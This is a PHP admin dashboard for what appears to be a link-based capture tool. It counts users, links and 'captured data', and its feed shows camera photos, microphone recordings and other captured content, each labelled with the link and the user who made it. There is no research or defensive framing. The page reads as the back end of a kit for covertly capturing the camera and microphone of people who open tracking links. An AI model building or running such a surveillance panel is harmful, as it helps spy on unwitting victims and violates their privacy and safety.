<?php
requireLogin();
$user = getCurrentUser();

// Check if user is admin
$stmt = $pdo->prepare("SELECT is_admin FROM users WHERE id = ?");
$stmt->execute([$user['id']]);
$u = $stmt->fetch();
if (!$u || !$u['is_admin']) {
    echo "<div class='min-h-screen flex items-center justify-center bg-slate-50'><div class='text-center p-12 bg-white rounded-[2.5rem] shadow-xl border border-slate-100'><div class='w-20 h-20 bg-rose-50 text-rose-600 rounded-3xl flex items-center justify-center mx-auto mb-6 text-3xl'><i class='fas fa-shield-halved'></i></div><h1 class='text-2xl font-extrabold text-slate-900 mb-2'>Access Denied</h1><p class='text-slate-500 font-medium'>You do not have permission to access this area.</p><a href='?page=dashboard' class='mt-8 inline-block bg-indigo-600 text-white px-8 py-3 rounded-2xl font-bold shadow-lg shadow-indigo-200 hover:bg-indigo-700 transition-all'>Back to Dashboard</a></div></div>";
    exit;
}

// Admin Actions
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_action'])) {
    if ($_POST['admin_action'] === 'delete_user') {
        $uid = $_POST['user_id'];
        $pdo->prepare("DELETE FROM users WHERE id = ? AND is_admin = 0")->execute([$uid]);
    }
}

// Fetch stats
$total_users = $pdo->query("SELECT COUNT(*) FROM users")->fetchColumn();
$total_links = $pdo->query("SELECT COUNT(*) FROM links")->fetchColumn();
$total_captures = $pdo->query("SELECT COUNT(*) FROM captured_data")->fetchColumn();

$users = $pdo->query("SELECT u.*, (SELECT COUNT(*) FROM links WHERE user_id = u.id) as link_count FROM users u ORDER BY created_at DESC")->fetchAll();
?>

<div class="space-y-8 animate-in fade-in duration-500">
    <!-- Header -->
    <div class="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
            <h1 class="text-3xl font-extrabold text-slate-900">System Control Panel</h1>
            <p class="text-slate-500 font-medium">Global administration and user management.</p>
        </div>
        <div class="flex items-center gap-3">
            <div class="px-4 py-2 bg-indigo-600 text-white rounded-xl font-bold text-xs uppercase tracking-widest flex items-center gap-2">
                <i class="fas fa-crown"></i>
                Root Admin
            </div>
        </div>
    </div>

    <!-- Admin Stats -->
    <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
        <div class="bg-white p-6 rounded-3xl border border-slate-100 shadow-sm flex items-center gap-5">
            <div class="w-14 h-14 bg-blue-50 text-blue-600 rounded-2xl flex items-center justify-center text-xl">
                <i class="fas fa-users"></i>
            </div>
            <div>
                <p class="text-sm font-bold text-slate-500 uppercase tracking-wider">Total Users</p>
                <p class="text-2xl font-extrabold text-slate-900"><?= $total_users ?></p>
            </div>
        </div>
        <div class="bg-white p-6 rounded-3xl border border-slate-100 shadow-sm flex items-center gap-5">
            <div class="w-14 h-14 bg-indigo-50 text-indigo-600 rounded-2xl flex items-center justify-center text-xl">
                <i class="fas fa-link"></i>
            </div>
            <div>
                <p class="text-sm font-bold text-slate-500 uppercase tracking-wider">Total Links</p>
                <p class="text-2xl font-extrabold text-slate-900"><?= $total_links ?></p>
            </div>
        </div>
        <div class="bg-white p-6 rounded-3xl border border-slate-100 shadow-sm flex items-center gap-5">
            <div class="w-14 h-14 bg-emerald-50 text-emerald-600 rounded-2xl flex items-center justify-center text-xl">
                <i class="fas fa-database"></i>
            </div>
            <div>
                <p class="text-sm font-bold text-slate-500 uppercase tracking-wider">Total Data</p>
                <p class="text-2xl font-extrabold text-slate-900"><?= $total_captures ?></p>
            </div>
        </div>
    </div>

    <!-- Global Intelligence Feed -->
    <div class="bg-white rounded-[2.5rem] border border-slate-100 shadow-sm overflow-hidden mb-8">
        <div class="p-8 border-b border-slate-50 flex items-center justify-between">
            <h3 class="text-xl font-extrabold text-slate-900">Global Intelligence Feed</h3>
            <span class="text-xs font-bold text-slate-400 uppercase tracking-widest">Recent Captures</span>
        </div>
        <div class="p-8">
            <?php
            $recent_data = $pdo->query("
                SELECT cd.*, l.title as link_title, u.username 
                FROM captured_data cd 
                JOIN links l ON cd.link_id = l.id 
                JOIN users u ON l.user_id = u.id 
                ORDER BY cd.captured_at DESC 
                LIMIT 10
            ")->fetchAll();
            
            if (empty($recent_data)): ?>
                <p class="text-center text-slate-400 py-4">No data captured yet.</p>
            <?php else: ?>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <?php foreach ($recent_data as $row): ?>
                        <div class="p-4 bg-slate-50 rounded-2xl border border-slate-100">
                            <div class="flex justify-between items-start mb-3">
                                <div class="flex items-center gap-2">
                                    <span class="px-2 py-1 bg-indigo-100 text-indigo-600 text-[8px] font-extrabold rounded uppercase"><?= htmlspecialchars($row['data_type']) ?></span>
                                    <span class="text-[10px] font-bold text-slate-400"><?= date('H:i', strtotime($row['captured_at'])) ?></span>
                                </div>
                                <span class="text-[10px] font-bold text-slate-500">By: <?= htmlspecialchars($row['username']) ?></span>
                            </div>
                            <?php if ($row['data_type'] === 'camera'): ?>
                                <img src="<?= htmlspecialchars($row['file_path']) ?>" class="w-full h-32 object-cover rounded-xl mb-2 border border-white shadow-sm">
                            <?php elseif ($row['data_type'] === 'microphone'): ?>
                                <audio controls class="w-full scale-75 origin-left"><source src="<?= htmlspecialchars($row['file_path']) ?>" type="audio/webm"></audio>
                            <?php else: ?>
                                <p class="text-xs text-slate-600 truncate"><?= htmlspecialchars($row['data_content']) ?></p>
                            <?php endif; ?>
                            <p class="text-[9px] font-bold text-slate-400 mt-2 uppercase truncate">Link: <?= htmlspecialchars($row['link_title']) ?></p>
                        </div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- User Management Table -->
    <div class="bg-white rounded-[2.5rem] border border-slate-100 shadow-sm overflow-hidden">
        <div class="p-8 border-b border-slate-50 flex items-center justify-between">
            <h3 class="text-xl font-extrabold text-slate-900">User Management</h3>
            <div class="flex items-center gap-2">
                <span class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
                <span class="text-xs font-bold text-slate-400 uppercase tracking-widest">System Online</span>
            </div>
        </div>
        <div class="overflow-x-auto">
            <table class="w-full text-left">
                <thead class="bg-slate-50 text-slate-400 uppercase text-[10px] tracking-widest font-extrabold">
                    <tr>
                        <th class="px-8 py-4">User</th>
                        <th class="px-8 py-4">Stats</th>
                        <th class="px-8 py-4">Joined</th>
                        <th class="px-8 py-4 text-right">Actions</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-slate-50">
                    <?php foreach ($users as $u): ?>
                        <tr class="hover:bg-slate-50/50 transition-colors">
                            <td class="px-8 py-5">
                                <div class="flex items-center gap-3">
                                    <div class="w-10 h-10 rounded-xl bg-slate-100 flex items-center justify-center font-bold text-slate-500">
                                        <?= strtoupper(substr($u['username'], 0, 1)) ?>
                                    </div>
                                    <div>
                                        <div class="flex items-center gap-2">
                                            <span class="font-bold text-slate-900"><?= htmlspecialchars($u['username']) ?></span>
                                            <?php if ($u['is_admin']): ?>
                                                <span class="px-2 py-0.5 bg-indigo-600 text-white text-[8px] font-extrabold rounded-md uppercase">Admin</span>
                                            <?php endif; ?>
                                        </div>
                                        <p class="text-xs text-slate-400 font-medium"><?= htmlspecialchars($u['email']) ?></p>
                                    </div>
                                </div>
                            </td>
                            <td class="px-8 py-5">
                                <div class="flex items-center gap-2">
                                    <span class="px-3 py-1 bg-indigo-50 text-indigo-600 text-[10px] font-extrabold rounded-full uppercase"><?= $u['link_count'] ?> Links</span>
                                </div>
                            </td>
                            <td class="px-8 py-5 text-sm text-slate-500 font-bold">
                                <?= date('d M Y', strtotime($u['created_at'])) ?>
                            </td>
                            <td class="px-8 py-5 text-right">
                                <?php if (!$u['is_admin']): ?>
                                    <form method="POST" onsubmit="return confirm('Delete this user and all their data?');" class="inline-block">
                                        <input type="hidden" name="admin_action" value="delete_user">
                                        <input type="hidden" name="user_id" value="<?= $u['id'] ?>">
                                        <button type="submit" class="w-10 h-10 flex items-center justify-center bg-rose-50 text-rose-600 rounded-xl hover:bg-rose-600 hover:text-white transition-all shadow-sm">
                                            <i class="fas fa-trash-alt text-sm"></i>
                                        </button>
                                    </form>
                                <?php else: ?>
                                    <span class="text-[10px] font-extrabold text-slate-300 uppercase tracking-widest">Protected</span>
                                <?php endif; ?>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>
</div>
